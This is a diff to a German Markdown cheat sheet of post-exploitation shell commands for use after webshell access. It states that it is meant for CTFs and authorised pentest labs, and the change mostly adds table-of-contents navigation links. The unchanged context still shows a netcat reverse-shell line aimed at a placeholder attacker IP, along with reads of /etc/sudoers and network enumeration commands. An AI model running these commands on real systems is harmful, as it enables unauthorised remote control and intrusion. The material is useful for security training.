@@ -18,6 +18,14 @@
 
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Einleitung
 
 Diese Datei enthält nützliche Shell-Befehle, die häufig **nach erfolgreichem Zugriff über eine Webshell** verwendet werden – z. B. durch eine PHP Remote Code Execution (RCE), Datei-Upload oder Command Injection.  
@@ -27,6 +35,14 @@ Sie eignet sich hervorragend für **CTFs**, **Penetration Testing Labs** oder al
 > Die Befehle dienen ausschließlich **Schulungszwecken** oder autorisierten Tests in isolierten, legalen Umgebungen.  
 > Jeder unautorisierte Zugriff auf Drittsysteme ist illegal und strafbar.
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Informationsgewinnung
@@ -63,6 +79,14 @@ cat /etc/sudoers        # Sudo-Rechte überprüfen
 
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Netzwerk-Analyse
 ```bash
 ifconfig                # Netzwerkinterfaces (älter)
@@ -71,6 +95,14 @@ netstat -an             # Offene Ports
 netstat -tulpn          # Dienste mit Ports und PIDs
 ```
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Systemdienste & Prozesse
@@ -100,11 +132,27 @@ which perl                              # Perl vorhanden?
 
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Kommunikation (Reverse Shells)
 ### Netcat Reverse Shell (Linux)
 ```bash
 nc <attacker-ip> 4444 -e /bin/bash
 ```
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
 
 ### Bash Reverse Shell
 ```bash
@@ -132,6 +180,14 @@ cat test.txt                  # Datei anzeigen
 rm test.txt                   # Datei löschen
 ```
 
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 ## Befehle debuggen (Beispiel in PHP-Webshell)
@@ -166,11 +222,27 @@ tail -f /var/log/auth.log  # SSH/Authentifizierungsversuche
 
 
 
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
+
+
 ## Siehe auch:
 
 - [php_web_shell_bypass_tricks.md](/03-web-security/angriffe/webshells/php_web_shell_bypass_tricks.md)
 - [post_exploitation_tools.md](/04-host-security/post_exploitation_tools.md)
 - [php_web_whell_usage.md](/03-web-security/angriffe/webshells/php_web_whell_usage.md)
+
+
+
+<div align=right>
+
+[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
+
+</div>
 
 
 
@@ -186,12 +258,6 @@ Dieses Projekt richtet sich an White-Hat-Sicherheitsforscher, Ethical Hacker und
 [Disclaimer](/00-disclaimer/disclaimer.md)
 
 --- 
-
-<div align=right>
-
-[↑ Inhaltsverzeichnis](#inhaltsverzeichnis)
-
-</div>
 
 Stay curious – stay secure. 🔐
 
